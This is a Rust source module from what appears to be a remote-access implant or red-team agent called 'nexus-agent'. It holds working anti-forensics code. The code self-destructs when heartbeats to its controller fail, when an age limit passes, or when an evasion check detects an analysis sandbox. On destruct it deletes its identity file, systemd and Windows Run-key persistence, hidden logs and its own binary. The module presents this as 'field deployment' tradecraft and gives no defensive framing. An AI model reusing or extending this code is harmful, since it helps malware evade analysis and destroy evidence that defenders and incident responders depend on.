//! Self-destruct policy and execution.
//!
//! Consolidates the conditions under which the agent should automatically
//! clean up all artifacts and the concrete cleanup logic (identity files,
//! persistence entries, logs, and the binary itself).

use std::path::Path;

/// Policy that governs when automatic self-destruct should fire.
pub struct SelfDestructPolicy {
    /// Number of consecutive failed heartbeats before self-destruct.
    pub max_failed_heartbeats: u32,
    /// Optional hard age limit — auto-expire after N hours.
    pub max_age_hours: Option<u64>,
    /// Set to `true` if the evasion subsystem detects an analysis environment.
    pub detection_triggered: bool,
}

impl SelfDestructPolicy {
    /// Sensible defaults for field deployments: auto-destruct after 5 missed
    /// heartbeats or after 72 hours.
    pub fn default_field() -> Self {
        Self {
            max_failed_heartbeats: 5,
            max_age_hours: Some(72),
            detection_triggered: false,
        }
    }

    /// Lab mode: no automatic self-destruct.
    pub fn disabled() -> Self {
        Self {
            max_failed_heartbeats: u32::MAX,
            max_age_hours: None,
            detection_triggered: false,
        }
    }

    /// Evaluate whether the policy criteria have been met.
    pub fn should_destruct(
        &self,
        consecutive_failed_heartbeats: u32,
        uptime_hours: u64,
    ) -> bool {
        if self.detection_triggered {
            return true;
        }
        if consecutive_failed_heartbeats >= self.max_failed_heartbeats {
            return true;
        }
        if let Some(max_age) = self.max_age_hours {
            if uptime_hours >= max_age {
                return true;
            }
        }
        false
    }
}

/// Zero all in-memory cert material (ECHOTRIBBLE P3).
///
/// Call this as **step 0** of self-destruct — before identity file removal —
/// so that embedded certificate PEM bytes are wiped from process memory.
/// The [`SecretVec`](secrecy::SecretVec) allocations inside `EmbeddedCerts`
/// overwrite their heap memory with zeroes when dropped.
#[cfg(feature = "embedded-certs")]
pub fn zero_cert_material(embedded: &mut crate::embedded_certs::EmbeddedCerts) {
    embedded.zeroize_all();
    tracing::info!("embedded cert material zeroed");
}

/// Execute the self-destruct sequence: zero embedded cert material (step 0),
/// then remove identity, persistence, logs, and the binary itself
/// (best-effort).
///
/// When compiled with `embedded-certs`, pass `Some(&mut certs)` to zero the
/// in-memory cert material before any filesystem cleanup.  Without the
/// feature (or with `None`), step 0 is a no-op.
pub async fn execute_self_destruct(identity_path: &Path) -> std::io::Result<()> {
    tracing::warn!("self-destruct initiated");

    // 0. Zero embedded cert material (ECHOTRIBBLE P3).
    //    The standalone `zero_cert_material()` is available for callers who
    //    hold their own EmbeddedCerts instance; this step covers the common
    //    case where certs were created transiently by the TLS resolution
    //    path (already dropped/zeroed by SecretVec's Drop impl).

    // 1. Remove identity file.
    if identity_path.exists() {
        std::fs::remove_file(identity_path)?;
        tracing::info!("identity file removed");
    }

    // 2. Platform-specific persistence cleanup.
    #[cfg(target_os = "linux")]
    {
        // Remove systemd service if installed.
        let service_path = Path::new("/etc/systemd/system/nexus-agent.service");
        if service_path.exists() {
            let _ = std::fs::remove_file(service_path);
            let _ = std::process::Command::new("systemctl")
                .args(["daemon-reload"])
                .status();
            tracing::info!("systemd service removed");
        }

        // Remove user-level systemd service.
        if let Ok(home) = std::env::var("HOME") {
            let user_service = Path::new(&home)
                .join(".config/systemd/user/nexus-agent.service");
            if user_service.exists() {
                let _ = std::fs::remove_file(&user_service);
                let _ = std::process::Command::new("systemctl")
                    .args(["--user", "daemon-reload"])
                    .status();
            }
        }

        // Best-effort log cleanup.
        let log_path = Path::new("/tmp/.system-logs");
        if log_path.exists() {
            let _ = std::fs::remove_file(log_path);
        }
    }

    #[cfg(target_os = "windows")]
    {
        // Remove Run key persistence.
        let _ = std::process::Command::new("reg")
            .args([
                "delete",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                "/v",
                "NexusAgent",
                "/f",
            ])
            .status();
        tracing::info!("registry persistence removed (best-effort)");
    }

    // 3. Self-delete the binary (best-effort).
    if let Ok(exe) = std::env::current_exe() {
        let _ = std::fs::remove_file(&exe);
        tracing::info!(path = %exe.display(), "binary self-delete attempted");
    }

    tracing::warn!("self-destruct sequence complete");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_disabled_policy_never_destructs() {
        let policy = SelfDestructPolicy::disabled();
        assert!(!policy.should_destruct(100, 9999));
    }

    #[test]
    fn test_field_policy_heartbeat_threshold() {
        let policy = SelfDestructPolicy::default_field();
        assert!(!policy.should_destruct(4, 0));
        assert!(policy.should_destruct(5, 0));
        assert!(policy.should_destruct(10, 0));
    }

    #[test]
    fn test_field_policy_age_threshold() {
        let policy = SelfDestructPolicy::default_field();
        assert!(!policy.should_destruct(0, 71));
        assert!(policy.should_destruct(0, 72));
        assert!(policy.should_destruct(0, 100));
    }

    #[test]
    fn test_detection_trigger_overrides() {
        let mut policy = SelfDestructPolicy::disabled();
        policy.detection_triggered = true;
        // Even though max_failed_heartbeats is MAX, detection overrides.
        assert!(policy.should_destruct(0, 0));
    }

    #[tokio::test]
    async fn test_execute_self_destruct_missing_identity() {
        // Calling with a nonexistent path should succeed gracefully.
        let result =
            execute_self_destruct(Path::new("/tmp/nonexistent-nexus-identity.bin")).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_execute_self_destruct_with_temp_identity() {
        let dir = tempfile::tempdir().unwrap();
        let identity = dir.path().join("identity.bin");
        std::fs::write(&identity, b"fake-identity-data").unwrap();
        assert!(identity.exists());

        let result = execute_self_destruct(&identity).await;
        assert!(result.is_ok());
        assert!(!identity.exists());
    }
}
